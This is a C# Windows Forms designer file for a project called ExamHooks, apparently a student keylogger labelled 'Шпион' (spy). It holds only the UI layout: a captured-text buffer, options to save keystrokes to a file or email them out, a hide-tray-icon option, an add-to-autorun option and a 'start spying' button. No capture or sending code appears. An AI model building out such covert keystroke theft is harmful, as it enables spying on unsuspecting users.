namespace ExamHooks
{
    partial class Form1
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.tbSetText = new System.Windows.Forms.TextBox();
            this.numUD = new System.Windows.Forms.NumericUpDown();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.cbNotifyIcon = new System.Windows.Forms.CheckBox();
            this.tbEmail = new System.Windows.Forms.TextBox();
            this.tbFilePath = new System.Windows.Forms.TextBox();
            this.rbWriteToFile = new System.Windows.Forms.RadioButton();
            this.rbSendToEmail = new System.Windows.Forms.RadioButton();
            this.folderBrowserDialog1 = new System.Windows.Forms.FolderBrowserDialog();
            this.bSetFilePath = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.cbAutoRun = new System.Windows.Forms.CheckBox();
            this.bSetHook = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.numUD)).BeginInit();
            this.SuspendLayout();
            // 
            // tbSetText
            // 
            this.tbSetText.Location = new System.Drawing.Point(12, 12);
            this.tbSetText.Multiline = true;
            this.tbSetText.Name = "tbSetText";
            this.tbSetText.ReadOnly = true;
            this.tbSetText.Size = new System.Drawing.Size(170, 87);
            this.tbSetText.TabIndex = 0;
            // 
            // numUD
            // 
            this.numUD.Increment = new decimal(new int[] {
            20,
            0,
            0,
            0});
            this.numUD.Location = new System.Drawing.Point(344, 13);
            this.numUD.Name = "numUD";
            this.numUD.Size = new System.Drawing.Size(83, 22);
            this.numUD.TabIndex = 1;
            this.numUD.Value = new decimal(new int[] {
            20,
            0,
            0,
            0});
            this.numUD.ValueChanged += new System.EventHandler(this.numUD_ValueChanged);
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Text = "Шпион";
            this.notifyIcon1.Visible = true;
            this.notifyIcon1.Click += new System.EventHandler(this.NotifyIcon1_Click);
            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
            // 
            // cbNotifyIcon
            // 
            this.cbNotifyIcon.AutoSize = true;
            this.cbNotifyIcon.Location = new System.Drawing.Point(196, 77);
            this.cbNotifyIcon.Name = "cbNotifyIcon";
            this.cbNotifyIcon.Size = new System.Drawing.Size(233, 21);
            this.cbNotifyIcon.TabIndex = 2;
            this.cbNotifyIcon.Text = "Скрыть иконку в панели задач";
            this.cbNotifyIcon.UseVisualStyleBackColor = true;
            this.cbNotifyIcon.CheckedChanged += new System.EventHandler(this.cbNotifyIcon_CheckedChanged);
            // 
            // tbEmail
            // 
            this.tbEmail.Location = new System.Drawing.Point(194, 167);
            this.tbEmail.Name = "tbEmail";
            this.tbEmail.Size = new System.Drawing.Size(233, 22);
            this.tbEmail.TabIndex = 3;
            // 
            // tbFilePath
            // 
            this.tbFilePath.Location = new System.Drawing.Point(196, 104);
            this.tbFilePath.Name = "tbFilePath";
            this.tbFilePath.Size = new System.Drawing.Size(231, 22);
            this.tbFilePath.TabIndex = 6;
            // 
            // rbWriteToFile
            // 
            this.rbWriteToFile.AutoSize = true;
            this.rbWriteToFile.Location = new System.Drawing.Point(12, 105);
            this.rbWriteToFile.Name = "rbWriteToFile";
            this.rbWriteToFile.Size = new System.Drawing.Size(126, 21);
            this.rbWriteToFile.TabIndex = 7;
            this.rbWriteToFile.TabStop = true;
            this.rbWriteToFile.Text = "Запись в файл";
            this.rbWriteToFile.UseVisualStyleBackColor = true;
            this.rbWriteToFile.CheckedChanged += new System.EventHandler(this.rbWriteToFile_CheckedChanged);
            // 
            // rbSendToEmail
            // 
            this.rbSendToEmail.AutoSize = true;
            this.rbSendToEmail.Location = new System.Drawing.Point(12, 168);
            this.rbSendToEmail.Name = "rbSendToEmail";
            this.rbSendToEmail.Size = new System.Drawing.Size(170, 21);
            this.rbSendToEmail.TabIndex = 8;
            this.rbSendToEmail.TabStop = true;
            this.rbSendToEmail.Text = "Отправлять на почту";
            this.rbSendToEmail.UseVisualStyleBackColor = true;
            this.rbSendToEmail.CheckedChanged += new System.EventHandler(this.rbSendToEmail_CheckedChanged);
            // 
            // bSetFilePath
            // 
            this.bSetFilePath.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.bSetFilePath.Location = new System.Drawing.Point(315, 132);
            this.bSetFilePath.Name = "bSetFilePath";
            this.bSetFilePath.Size = new System.Drawing.Size(112, 29);
            this.bSetFilePath.TabIndex = 10;
            this.bSetFilePath.Text = "Путь к файлу";
            this.bSetFilePath.UseVisualStyleBackColor = true;
            this.bSetFilePath.Click += new System.EventHandler(this.bSetFilePath_Click);
            // 
            // label1
            // 
            this.label1.Location = new System.Drawing.Point(193, 9);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(145, 36);
            this.label1.TabIndex = 11;
            this.label1.Text = "Количество символов в буфере";
            // 
            // cbAutoRun
            // 
            this.cbAutoRun.AutoSize = true;
            this.cbAutoRun.Location = new System.Drawing.Point(196, 50);
            this.cbAutoRun.Name = "cbAutoRun";
            this.cbAutoRun.Size = new System.Drawing.Size(195, 21);
            this.cbAutoRun.TabIndex = 12;
            this.cbAutoRun.Text = "Добавить в автозагрузку";
            this.cbAutoRun.UseVisualStyleBackColor = true;
            this.cbAutoRun.CheckedChanged += new System.EventHandler(this.cbAutoRun_CheckedChanged);
            // 
            // bSetHook
            // 
            this.bSetHook.Location = new System.Drawing.Point(12, 198);
            this.bSetHook.Name = "bSetHook";
            this.bSetHook.Size = new System.Drawing.Size(415, 23);
            this.bSetHook.TabIndex = 13;
            this.bSetHook.Text = "Начнем шпионаж)";
            this.bSetHook.UseVisualStyleBackColor = true;
            this.bSetHook.Click += new System.EventHandler(this.bSetHook_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(439, 233);
            this.Controls.Add(this.bSetHook);
            this.Controls.Add(this.cbAutoRun);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.bSetFilePath);
            this.Controls.Add(this.rbSendToEmail);
            this.Controls.Add(this.rbWriteToFile);
            this.Controls.Add(this.tbFilePath);
            this.Controls.Add(this.tbEmail);
            this.Controls.Add(this.cbNotifyIcon);
            this.Controls.Add(this.numUD);
            this.Controls.Add(this.tbSetText);
            this.Name = "Form1";
            this.Text = "Шпион";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            ((System.ComponentModel.ISupportInitialize)(this.numUD)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox tbSetText;
        private System.Windows.Forms.NumericUpDown numUD;
        private System.Windows.Forms.NotifyIcon notifyIcon1;
        private System.Windows.Forms.CheckBox cbNotifyIcon;
        private System.Windows.Forms.TextBox tbEmail;
        private System.Windows.Forms.TextBox tbFilePath;
        private System.Windows.Forms.RadioButton rbWriteToFile;
        private System.Windows.Forms.RadioButton rbSendToEmail;
        private System.Windows.Forms.FolderBrowserDialog folderBrowserDialog1;
        private System.Windows.Forms.Button bSetFilePath;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.CheckBox cbAutoRun;
        private System.Windows.Forms.Button bSetHook;
    }
}

